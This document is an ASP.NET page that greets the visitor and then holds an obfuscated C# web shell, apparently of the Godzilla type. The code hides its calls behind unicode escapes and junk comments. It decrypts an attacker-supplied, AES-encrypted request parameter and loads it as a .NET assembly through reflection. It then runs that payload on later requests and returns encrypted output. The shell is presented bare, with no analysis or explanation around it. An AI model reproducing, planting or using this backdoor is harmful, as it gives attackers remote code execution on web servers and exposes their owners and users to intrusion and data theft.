WelCome You!
<%@ PAge LaNgUagE="C#"%>
<%try {
string xlpasssSDzcQZu = S\u0079st\u0065\u006D.Text.ASCIIEncoding.ASCII.GetString(S\u0079st\u0065\u006D.Convert.FromBase64String(S\u0079st\u0065\u006D.Text.ASCIIEncoding.ASCII.GetString(S\u0079st\u0065\u006D.Convert.FromBase64String(("UlRaSVJYTXlUV3M9")))));
string xlpassDLrZQwfw = "67ce76b5b421358a";
string xlpassCmlWwooq = S\u0079st\u0065\u006D./*BkLXGhfF*/BitConverter/*CJtSIyyC*/.ToString(new /*jGQFsDBz*/S\u0079st\u0065\u006D.Security/*YAviWFRx*/.Cryptography.MD5CryptoServiceProvider()/*JSBxsSAb*/.ComputeHash/*aenLYQay*/(S\u0079st\u0065\u006D.Text./*WyjOXQul*/Encoding.Default.GetBytes(xlpasssSDzcQZu + xlpassDLrZQwfw)))./*hcYuBcnV*/Replace("-", "");
byte[] xlpassmfWZejxr = S\u0079st\u0065\u006D./*zRnTySyB*/Convert/*EgHslpUh*/./*iJMSThAE*/FromBase64String/*rOCwjBDv*/(Context.Request[xlpasssSDzcQZu]);
xlpassmfWZejxr = new S\u0079st\u0065\u006D/*yRckeSHP*/.Security.Cryptography/*XriYeKQG*/./*KxDhkczf*/RijndaelManaged()./*BEKzDDwe*/CreateDecryptor(S\u0079st\u0065\u006D./*vOianhJr*/Text.Encoding.Default/*TsvzKUvw*/.GetBytes(xlpassDLrZQwfw), S\u0079st\u0065\u006D.Text./*LyGDYABj*/Encoding.Default.GetBytes(xlpassDLrZQwfw))./*jkLTwLll*/TransformFinalBlock(xlpassmfWZejxr, 0, xlpassmfWZejxr.Length);
if (Context./*XkoplDmV*/Session["payload"] == null)
{Context/*qySxUcIJ*/.Session["payload"] = (/*vkhZQjuM*/S\u0079st\u0065\u006D.Reflection./*WqEbfgIE*/Assembly)typeof(S\u0079st\u0065\u006D/*aNKlsvIX*/.Reflection.Assembly).GetMethod("Load", new S\u0079st\u0065\u006D.Type[] { typeof(byte[]) })./*wIzhwQNw*/Invoke(null, new object[] { xlpassmfWZejxr });;}
else { S\u0079st\u0065\u006D.IO./*CmyovTry*/MemoryStream xlpassMCafJnQb = new S\u0079st\u0065\u006D.IO/*blHKctcy*/.MemoryStream();
object xlpassnhIXfElc = ((S\u0079st\u0065\u006D.Reflection.Assembly/*ytRdRebA*/)Context.Session/*iObJKOpD*/["payload"]).CreateInstance("LY");
xlpassnhIXfElc.Equals(Context);
xlpassnhIXfElc.Equals/*gDAbZVrQ*/(xlpassMCafJnQb);
xlpassnhIXfElc.Equals(xlpassmfWZejxr);
xlpassnhIXfElc.ToString()/*bfATpABR*//*ULVshscw*/;
byte[] xlpassYaJsQljL = xlpassMCafJnQb.ToArray();
Context.Re\u0073p\u006Fn\u0073e/*oUrJrrVJ*/.Write(xlpassCmlWwooq.Substring(0, 16));
Context.Re\u0073p\u006Fn\u0073e.Write(S\u0079st\u0065\u006D.Convert./*cGNXwDMg*/ToBase64String/*kAPGSNLX*/(new S\u0079st\u0065\u006D./*XIBRiInG*/Security.Cryptography./*UjrwriKs*/RijndaelManaged().CreateEncryptor/*mAdQIIGC*/(S\u0079st\u0065\u006D.Text.Encoding.Default/*yLrFuHZa*/.GetBytes(xlpassDLrZQwfw), S\u0079st\u0065\u006D.Text./*kPjIbYJg*/Encoding.Default.GetBytes(xlpassDLrZQwfw)).TransformFinalBlock/*KNNqnCFx*/(xlpassYaJsQljL, 0, xlpassYaJsQljL.Length)));
Context/*yhlsnaSv*/.Re\u0073p\u006Fn\u0073e.Write(xlpassCmlWwooq.Substring(16));}}
catch (S\u0079st\u0065\u006D.Exception) {};
%>